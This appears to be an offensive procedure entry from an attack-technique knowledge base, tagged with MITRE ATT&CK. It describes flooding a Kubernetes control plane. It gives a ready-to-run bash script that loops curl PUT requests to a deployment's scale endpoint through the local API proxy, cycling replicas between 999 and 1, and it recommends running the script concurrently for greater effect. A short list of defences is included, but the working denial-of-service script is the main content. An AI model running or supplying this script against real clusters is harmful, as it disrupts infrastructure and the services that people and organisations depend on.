---
id: proc-k8s-scaling-script
tags:
  - kubernetes
  - scripting
  - dos
type: procedure
tools:
  - '[[tools/bash]]'
  - '[[tools/curl]]'
tactics:
  - '[[Impact]]'
commands:
  - '[[commands/curl-scale-up-deployment]]'
  - '[[commands/curl-scale-down-deployment]]'
verified: false
platforms:
  - Kubernetes
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[OS Exhaustion Flood]]'
updated_at: '2025-12-14T17:26:30.571Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Impact]]'
mitre_techniques:
  - '[[OS Exhaustion Flood]]'
---
# Create Kubernetes Scaling Script

## Summary

This procedure builds a bash script to automate 50+ cycles of scaling a deployment up to 999 and down to 1 replicas via curl to the proxied API, flooding the control plane.

## Description

The script uses loops to issue PUT requests to the deployment/scale endpoint, leveraging the large env var deployment to maximize per-operation overhead. Run concurrently for amplified effect; assumes proxy on 8001.

## Requirements

1. scale.json and scaledown.json prepared
2. bash environment
3. curl installed
4. Proxy running

## Defense

Defensive measures and detection strategies:

- API server rate limiting (--request-timeout, --max-mutating-requests)
- Detect high-frequency PUTs to scale subresources in logs
- Network-level throttling on API port

## Objectives

1. Automate rapid scale cycles
2. Simulate concurrency for DoS
3. Target specific deployment endpoint

## Instructions

### Step 1: Write the Script

**Context**: Create run.sh with a loop calling scale up and down.

**Command** (editor or cat):

```bash
cat > run.sh << EOF
#!/bin/bash
for i in {1..50}; do
  curl -X PUT 127.0.0.1:8001/apis/apps/v1/namespaces/default/deployments/nginx/scale -H "Content-Type: application/json" -d @scale.json
  curl -X PUT 127.0.0.1:8001/apis/apps/v1/namespaces/default/deployments/nginx/scale -H "Content-Type: application/json" -d @scaledown.json

done
EOF
chmod +x run.sh
```

> Generates executable script. Expected: ~50 cycles, each pair of curls.

### Step 2: Test Script Syntax

**Context**: Validate without execution.

**Command** (bash):

```bash
bash -n run.sh
```

> No output if valid.

## MITRE ATT&CK Mapping

### Tactics

- [[Impact]] Impact

### Techniques

- [[OS Exhaustion Flood]] OS Exhaustion Floods

### Sub-Techniques


## Commands Used

- [[commands/curl-scale-up-deployment]]
- [[commands/curl-scale-down-deployment]]

## Tools Used

- [[tools/bash]]
- [[tools/curl]]

## Tags

- kubernetes
- scripting
- dos
